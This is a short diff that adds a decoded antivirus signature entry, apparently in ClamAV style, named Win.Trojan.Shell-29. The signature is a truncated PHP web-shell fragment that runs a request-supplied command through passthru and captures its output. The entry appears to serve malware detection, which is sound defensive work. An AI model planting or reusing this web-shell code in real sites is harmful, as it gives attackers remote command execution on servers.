@@ -1,0 +1,5 @@
+VIRUS NAME: Win.Trojan.Shell-29
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: *
+DECODED SIGNATURE:
+<?php if (isset($chdir)) @chdir($chdir); ob_start( ); passthru("$cmd 2>&1"); $output = ob_get_contents(); ob_end_clean( ); ?> <?php if (!em
